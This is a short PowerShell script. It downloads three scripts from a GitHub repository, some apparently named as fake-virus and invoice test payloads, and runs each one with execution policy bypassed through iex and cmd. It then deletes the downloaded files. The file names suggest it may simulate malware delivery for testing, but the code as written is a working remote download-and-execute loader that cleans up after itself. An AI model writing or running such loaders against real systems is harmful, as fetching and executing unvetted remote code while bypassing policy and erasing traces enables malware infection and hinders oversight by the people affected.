$fileUris = @(
    'https://raw.githubusercontent.com/GhandiJones/powershell_scripts/master/test_pshell_scripts/auto_download_fake_virus.ps1',
    'https://raw.githubusercontent.com/GhandiJones/powershell_scripts/master/test_pshell_scripts/auto_invoice_test.ps1',
    'https://raw.githubusercontent.com/GhandiJones/powershell_scripts/master/test_pshell_scripts/scriptable_object.ps1'
    )

$index = 0
ForEach ($f in $fileUris) {
    $file = "psFile-" + $index + ".ps1"
    Invoke-WebRequest -Uri $f -OutFile $file

    $execute = $PSScriptRoot + "\$file"
    $execute

    iex('cmd /c start powershell -ExecutionPolicy Bypass -Command {{&{0}}}' -f $execute )

    $index += 1
}

Start-Sleep -Seconds 1.5
$index = 0
ForEach ($f in $fileUris) {
    $file = "psFile-" + $index + ".ps1"
    Remove-Item $file
    $index += 1
}
